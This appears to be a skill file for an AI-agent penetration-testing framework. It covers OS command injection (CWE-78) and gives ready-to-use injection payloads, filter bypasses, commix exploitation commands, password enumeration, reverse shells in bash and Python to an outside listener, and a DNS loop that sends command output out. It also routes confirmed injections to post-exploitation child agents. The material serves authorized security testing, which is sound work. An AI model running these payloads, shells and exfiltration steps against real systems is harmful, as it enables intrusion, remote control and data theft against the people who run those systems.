---
name: command-injection-testing
description: Detect and exploit OS command injection (WSTG-INPV-12, CWE-78) in web parameters, headers, and file names — manual separator/blind/OOB probing, full commix automation to pseudo-shell and reverse shell, interactsh for blind confirmation, and rupu-wired reporting of every confirmed injection. Use whenever a request parameter plausibly reaches a shell (ping/traceroute/lookup forms, filename handling, converters, report generators, admin diagnostics).
license: Apache-2.0
metadata:
  author: Section9Labs
  wstg: WSTG-INPV-12
  cwe: CWE-78
---

# OS Command Injection Testing

Goal: find every input that is concatenated into a shell command, prove execution
(in-band output, time delay, or OOB callback), escalate to interactive command
execution, and record the result as rupu assets + findings.

Depth lives in:
- `references/manual-cmdi.md` — full separator matrix, blind/OOB probes, filter bypasses, argument injection.
- `references/commix.md` — complete commix flag reference, techniques, shell upgrade.
- `references/rupu.md` — exact JSON shapes for work units, `assets.mark`, `findings.report`.

## 1. Pick candidate sinks

Prioritize parameters whose server-side job implies a shell: `ip`, `host`,
`domain`, `cmd`, `exec`, `ping`, `query`, `file`, `filename`, `path`, `dest`,
`url` (when fetched with curl/wget), image/PDF converters, zip/export features,
diagnostics pages. Also test HTTP headers (`User-Agent`, `X-Forwarded-For`,
`Referer`) and multipart filenames — these commonly land in log processors and
shell-outs.

Mark each candidate route as an asset at depth `mapped`
(`assets.mark`, kind `web:route` — shapes in `references/rupu.md`).

## 2. Manual detection

Work through three result channels in order; stop at the first one that proves
execution. Full payload matrix in `references/manual-cmdi.md`.

**In-band (output reflected).** Append each separator with a marker command and
diff the response:

```
;id
|id
&&id
||id
%0aid            (newline — critical for filters that strip ; and |)
`id`
$(id)
```

For `GET`, URL-encode (`;` → `%3b`, `&` → `%26`, newline → `%0a`, space →
`%20` or `+`). Confirmation = `uid=…(…)` or `whoami` output appearing in the
body. Windows: `& whoami`, `| whoami`, `%0a whoami`.

**Time-based blind (no output).** Baseline the response time 3×, then:

```
;sleep 10
|sleep 10
&&sleep 10
$(sleep 10)
;ping -c 10 127.0.0.1        (when sleep is filtered)
& timeout /T 10              (Windows)
& ping -n 10 127.0.0.1       (Windows)
```

A consistent +10s delta that scales when you change the sleep value (5 → 5s,
10 → 10s) is proof. Always re-test with two different durations to rule out
network jitter.

**OOB (output swallowed, timing unreliable).** Start interactsh:

```
interactsh-client -json -o oast.jsonl -v
```

Note the session hostname (e.g. `cbx7...xyz.oast.pro`), then inject per-param
unique subdomains so one callback pinpoints one parameter:

```
;nslookup p1-id.cbx7...xyz.oast.pro
;curl http://p1-id.cbx7...xyz.oast.pro/
$(dig p2-host.cbx7...xyz.oast.pro)
& nslookup p3.cbx7...xyz.oast.pro    (Windows)
```

Read `oast.jsonl`: a `dns` interaction proves the command ran even with no HTTP
egress; an `http` interaction additionally proves outbound HTTP (useful for the
reverse-shell decision). DNS-only hit = execution confirmed, plan OOB-only
exfil.

**Filters in the way?** `references/manual-cmdi.md` covers space bypass
(`${IFS}`, `$IFS$9`, `{cat,/etc/passwd}`, tabs), keyword splitting
(`w'h'o'am'i`, `wh\oami`), variable concat, base64 staging, and argument
injection (`--` boundaries, GTFOBins-style flag abuse like
`tar --checkpoint-action=exec=sh`).

## 3. Automate and exploit with commix

Full flag reference: `references/commix.md`. Core invocations:

```
# GET parameter
commix -u "https://example.com/diag?addr=203.0.113.5" --batch

# POST body, cookies, inject only one param
commix -u "https://example.com/diag" --data="addr=203.0.113.5&go=1" \
       -p addr --cookie="session=abc123" --batch

# Raw request file (export from Burp/mitmproxy) — most faithful replay
commix -r request.txt --force-ssl --batch

# Headers as injection points
commix -u "https://example.com/" --user-agent="commix-test" --level=3 --batch
```

Key knobs:
- `--level=1..3` — 3 adds cookies and HTTP headers as injection points.
- `--technique=classic|eval-based|time-based|file-based` — default tries all;
  pin `time-based` for blind, `file-based` when you have a writable web root.
- `--batch` — never prompt; required for pipeline runs.
- `--os-cmd="id"` — one command and exit; `--all` enumerates user/hostname/
  passwords after detection.
- `--prefix=";" --suffix=" #"` — when manual testing already told you the
  working separator, pin it to cut noise.
- `--alter-shell` — switch the pseudo-shell to Python; use when the default
  shell payloads are filtered.
- `--random-agent`, `--tamper=space2ifs,...` — evasion (see reference).

**Reading commix output.** Detection looks like:

```
(!) The parameter 'addr' seems injectable via (results-based) classic command injection technique.
    [~] Payload: ;echo UQQVZL$((61+40))$(echo UQQVZL)UQQVZL
Pseudo-Terminal Shell (type '?' for available options)
commix(os_shell) >
```

Capture: parameter, technique (classic / eval-based / time-based / file-based),
and the exact payload — these go into the finding. Session state persists in
`~/.commix/output/<host>/` (`logs.txt`, session db) — point `parse_cmdi.py` at
it.

**Shell upgrade.** From `commix(os_shell)`, run `reverse_tcp` (set `LHOST`/
`LPORT` to your listener, `nc -lvnp 4444` already running), or stage your own:

```
os_shell> bash -c 'bash -i >& /dev/tcp/198.51.100.7/4444 0>&1'
os_shell> python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("198.51.100.7",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
```

Blind targets with DNS-only egress: exfiltrate over DNS
(`for c in $(id|xxd -p); do nslookup $c.cbx7.oast.pro; done`).

## 4. Parse, record, hand off (rupu — required)

Every detection pass ends in rupu-ingestible output. Run the bundled parser:

```
# Normalize commix session logs and/or manual results into one JSON
python3 scripts/parse_cmdi.py \
    --commix-dir ~/.commix/output/example.com \
    --manual manual_hits.json \
    -o confirmed.json \
    --work-units units.json \
    --findings findings.json \
    --assets assets.json
```

- `confirmed.json` — normalized `{url, param, separator, technique, evidence}` records.
- `units.json` — a JSON array (first char `[`) of work units; hand it to the
  `work-units` skill / a `for_each:` workflow step so each confirmed injection
  fans out to an exploitation/post-ex child agent.
- `assets.json` — ready-made `assets.mark` payloads: kind `web:route`, depth
  `exploited` for confirmed injections (use `tested` for params probed clean);
  record them via the `coverage-assets` skill.
- `findings.json` — ready-made `findings.report` payloads: scope `endpoint`,
  `target_ref` = affected URL, severity `critical`, classification
  WSTG-INPV-12 / CWE-78, evidence containing the full HTTP request/response and
  command output. File each via the `finding-report` skill.

Exact JSON shapes and the three-output rule: `references/rupu.md`.

## 5. Decision table

| Observation | Conclusion | Next |
|---|---|---|
| Marker output (`uid=`) in response | In-band injection | commix `--technique=classic`, enumerate, shell |
| +Ns delay scaling with sleep value | Blind time-based | commix `--technique=time-based`, OOB exfil |
| interactsh DNS hit only | Blind, DNS egress only | DNS exfil loop; reverse shell over DNS tunneling if needed |
| interactsh HTTP hit | Blind, HTTP egress | curl-staged payloads, reverse shell |
| Delay only with `%0a`, not `;` | Separator filter | pin `--prefix="%0a"`, see bypass reference |
| 403/500 on metachars | WAF/filter | tamper scripts + encodings in `references/manual-cmdi.md` |
| Nothing on any channel | Likely clean | mark route `tested`, move on |
